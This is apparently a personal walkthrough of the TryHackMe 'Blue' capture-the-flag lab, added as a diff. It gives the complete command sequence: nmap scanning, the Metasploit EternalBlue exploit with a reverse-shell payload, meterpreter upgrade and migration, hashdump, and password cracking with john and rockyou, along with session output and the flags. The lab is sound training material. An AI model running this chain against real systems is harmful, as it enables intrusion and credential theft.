@@ -1,0 +1,78 @@
+https://tryhackme.com/room/blue
+Connected openvpn
+clicked Join room
+open kali 
+Task 1 recon, nmap 10.10.102.134 nmap2.txt
+nmap -sS -Pn -A -p -oN nmap.txt 10.10.102.134
+3 ports open under 1000, 445,139, 135
+check for scripts to run with nmap
+ls -al /usr/share/nmap/scripts | grep -e "smb"
+answer ms17-010
+nmap -sS -Pn -p 445 10.10.102.134 --script smb-vuln-ms17-010.nse
+msfconsole to start metasploit
+search  eternalblue
+found exploit #2
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+RHOSTS
+set RHOSTS 10.10.102.134 
+Set LHOST 10.9.0.46
+run
+failed
+run
+failed
+set payload windows/x64/shell/reverse_tcp
+failed
+connected ovpn in kali, disconnected windows
+run
+rebooted target vm, new ip
+set RHOSTS 10.10.142.123
+run 
+failed
+Set LPORT 4333, 4444 blocked by comcast)
+[*] 10.10.142.123:445 - Triggering free of corrupted buffer.
+[*] Sending stage (336 bytes) to 10.10.142.123
+[*] Command shell session 1 opened (10.9.0.46:4333 -> 10.10.142.123:49173) at 2021-02-28 22:11:58 -0500
+[+] 10.10.142.123:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.142.123:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.142.123:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+WIN
+meterpreter shell
+ctrl Z to background
+sessions
+search shell_to
+use post/multi/manage/shell_to_meterpreter
+answered post/multi/manage/shell_to_meterpreter
+SESSIONS is answer
+sessions
+set session 1
+fail
+set sessions 1
+fail
+sessions 1
+shell
+ps
+migrate 2552
+failed access denied
+migrate 3056
+whoami
+hashdump
+vim hashes.txt
+ls -al /usr/share/wordlists/
+gzip -d /usr/share/wordlists/rockyou.txt.gz 
+sudo john --format=NT  --wordlist=/usr/share/wordlists/rockyou.txt hashes2.txt
+pasword alqfna22 
+dir
+cat flag1.txt
+flag{access_the_machine
+search -f *.txt
+search -f flag2.txt
+cd c:\windows\system32\config\flag2.txt
+cat flag2.txt
+flag{sam_database_elevated_access
+cd documents
+found flag3.txt
+cat flag3.txt
+flag{admin_documents_can_be_valuable
+
+## Don't ctrl-c, end shell, etc.  ctrl -Z to background shell,  type shell when in meterpreter, type exit to get back to c:\ ##
